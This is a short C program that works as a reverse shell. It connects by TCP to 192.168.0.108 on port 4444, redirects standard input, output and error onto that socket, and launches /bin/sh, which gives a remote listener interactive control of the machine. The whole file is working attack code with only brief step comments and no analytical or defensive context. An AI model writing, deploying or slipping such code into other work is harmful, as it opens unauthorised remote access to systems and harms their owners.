#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>


int main(void){
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(4444);
    client.sin_addr.s_addr = inet_addr("192.168.0.108");

    connect(socket_fd, (struct sockaddr *)&client, sizeof(client));

    //dup2 3 times for stdin stdout and stderr
    dup2(socket_fd, STDIN_FILENO);
    dup2(socket_fd, STDOUT_FILENO);
    dup2(socket_fd, STDERR_FILENO);


    //launch /bin/sh
    execve("/bin/sh", NULL, NULL);

    return 0;
}
